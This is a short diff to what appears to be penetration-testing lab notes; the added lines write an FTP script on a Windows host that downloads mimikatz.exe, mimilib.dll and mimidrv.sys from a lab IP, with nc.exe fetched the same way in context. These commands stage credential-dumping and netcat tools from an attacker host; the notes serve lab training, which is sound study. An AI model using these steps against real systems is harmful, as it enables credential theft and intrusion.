@@ -289,11 +289,23 @@ echo GET nc.exe >> ftp.txt
 echo bye >> ftp.txt
 
 ```
+Copy mimikatz files
+
+```
+echo open 192.168.119.175 21> ftp.txt
+echo USER offsec>> ftp.txt
+echo lab>> ftp.txt
+echo bin >> ftp.txt
+echo GET mimikatz.exe >> ftp.txt
+echo GET mimilib.dll >> ftp.txt
+echo GET mimidrv.sys >> ftp.txt
+echo bye >> ftp.txt
+```
 
 Run command
 
 ```
-ftp -v -n -s:ftp.txt
+ftp -i -v -n -s:ftp.txt
 ```
 
 
